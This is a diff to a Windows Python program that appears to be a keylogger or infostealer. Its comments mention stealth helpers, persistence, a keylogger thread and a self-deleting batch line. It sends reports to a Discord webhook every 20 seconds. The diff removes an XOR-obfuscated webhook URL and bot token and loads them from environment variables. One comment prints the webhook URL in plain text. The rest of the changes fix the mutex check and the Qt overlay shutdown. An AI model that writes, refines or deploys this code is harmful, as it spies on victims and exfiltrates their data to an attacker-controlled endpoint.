@@ -57,29 +57,26 @@ IMPORT_ERROR = None
 
 # SINGLE INSTANCE LOCK (FAIL SAFE)
 # This prevents the "Endless Opening" issue by ensuring only ONE instance runs.
+# SINGLE INSTANCE LOCK
+# Moved logic out of try/finally structure to ensure sys.exit works correctly
+SHOULD_EXIT = False
+
 try:
     kernel32 = ctypes.windll.kernel32
     # Local mutex to avoid permissions issues
     mutex = kernel32.CreateMutexW(None, False, "StarkCoreServices_Mutex_v23_Local")
     
-    # Check if mutex already exists (Error 183)
-    # ALSO check if mutex handle creation failed completely (0)
-    last_error = kernel32.GetLastError()
-    
-    if last_error == 183: # ERROR_ALREADY_EXISTS
-        sys.exit(0)
+    if kernel32.GetLastError() == 183: # ERROR_ALREADY_EXISTS
+        SHOULD_EXIT = True
         
-except Exception as e:
-    # Failsafe: If we can't create a mutex, we might be unstable.
-    # But in this case, we default to running (Fail Open) to ensure persistence works
-    # EXCEPT if we suspect we are a recursive child
-    pass 
- 
+except Exception:
+    pass
 
-# ... (omitted code) ...
+if SHOULD_EXIT:
+    sys.exit(0)
 
-
-finally:
+# Main Execution Block (No longer inside 'finally')
+if True:
     # --- STEALTH HELPERS ---
     def xor_dec(hex_str, key):
         import time # Ensure imported
@@ -123,15 +120,18 @@ finally:
 
     # Encrypted Constants (XOR-ed)
     # KEY: stark_industries_v3
-    XOR_KEY = "stark_industries_v3"
+    # Encrypted Constants (XOR-ed)
+    from dotenv import load_dotenv
+    load_dotenv()
+
+    # KEY: stark_industries_v3
+    XOR_KEY = os.getenv("XOR_KEY", "stark_industries_v3")
     
-    # URL: https://discord.com/api/webhooks/1453457035138961591/1RmgOridgcYqYr0mVduh55O2WOGekvTcg7C8OFb-GH7gDVd7gTiMPise8_kqkexHl6k1
-    ENCRYPTED_URL = "1b00150218654641001c00171d1b015d3c195e5c15111b44280c0c0c1a1c1f014654476a4507464351415e6e5a565d4342414b584a420d1b543c0608160c3c301f3d074319240d101b6a437c41232e350e341f3a071244374a26231172317b441325240f680e3a0d38231d010c5d2c340758160c291e5d3458"
+    # Encrypted Bot Token (Derived from .env)
+    ENCRYPTED_TOKEN = os.getenv("ENCRYPTED_DISCORD_TOKEN", "")
     
-    # TOKEN: MTQ1MjkzMz...
-    ENCRYPTED_TOKEN = "3e20304326350214290f2a033f032846122272463a1b235a10284023300b261a3b4b10083a591e380c061e161b2c3e4d4a430a581c24283772250d360b3272065f553339103c333c"
-    
-    WEBHOOK_URL = xor_dec(ENCRYPTED_URL, XOR_KEY)
+    # Direct webhook URL (for build)
+    WEBHOOK_URL = os.getenv("DISCORD_WEBHOOK_URL", "")
 
 
     SEND_REPORT_EVERY = 20 # Reporting interval in seconds
@@ -254,8 +254,13 @@ finally:
             self.anim_out.setDuration(800)
             self.anim_out.setStartValue(1.0)
             self.anim_out.setEndValue(0.0)
-            self.anim_out.finished.connect(self.close)
+            self.anim_out.finished.connect(self.close_and_quit)
             self.anim_out.start()
+
+        def close_and_quit(self):
+            self.close()
+            # Ensure the event loop exits
+            QApplication.instance().quit()
 
         def paintEvent(self, event):
             painter = QPainter(self)
@@ -2840,21 +2845,10 @@ del "%~f0"
                     # Process events to ensure paint happens immediately
                     app.processEvents()
                     
-                    # FORCED TIMEOUT THREAD - Guarantees overlay closes even if Qt freezes
-                    def force_quit_overlay():
-                        import time
-                        time.sleep(12)  # 10s display + 2s grace period
-                        try:
-                            app.quit()  # Gracefully quit Qt app (not entire process!)
-                        except:
-                            pass  # If app already closed, ignore
-                    
-                    # Start killer thread AFTER app is created
-                    Thread(target=force_quit_overlay, daemon=True).start()
-                    
-                    # Close the GUI app loop after 10 seconds (Wait for fade out)
-                    # But the process stays alive because kl_thread is non-daemon
-                    QTimer.singleShot(10000, app.quit) 
+                    # FORCED TIMEOUT (FAILSAFE)
+                    # We use QTimer on the main thread instead of a background thread
+                    # to avoid "calling Qt from a secondary thread" which causes deadlocks/crashes.
+                    QTimer.singleShot(13000, app.quit)
                     
                     app.exec_()
                 except Exception as e:
